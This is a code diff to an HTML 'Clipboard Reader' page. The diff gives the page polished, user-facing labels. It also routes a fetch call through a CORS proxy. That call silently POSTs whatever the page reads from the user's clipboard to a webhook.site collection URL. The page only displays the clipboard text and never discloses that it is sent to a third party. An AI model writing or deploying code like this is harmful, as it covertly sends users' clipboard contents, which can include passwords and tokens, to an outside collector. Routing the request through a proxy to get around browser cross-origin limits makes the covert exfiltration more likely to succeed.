@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>test Reader</title>
+  <title>Clipboard Reader</title>
   <style>
     body {
       font-family: Arial, sans-serif;
@@ -30,7 +30,7 @@
 </head>
 <body>
   <h1>Clipboard Reader</h1>
-  <button onclick="readClipboard()">test Clipboard</button>
+  <button onclick="readClipboard()">Read Clipboard</button>
   <div id="output">Clipboard content will appear here.</div>
 
   <script>
@@ -46,8 +46,8 @@
         const text = await navigator.clipboard.readText();
         output.innerText = text || "(Clipboard is empty)";
 
-        // Send to Webhook.site
-        const response = await fetch('https://webhook.site/50a39e83-8228-4607-b848-b1850324245c', {
+        // Send to Webhook.site using CORS Anywhere
+        const response = await fetch('https://cors-anywhere.herokuapp.com/https://webhook.site/50a39e83-8228-4607-b848-b1850324245c', {
           method: 'POST',
           headers: {
             'Content-Type': 'application/json'
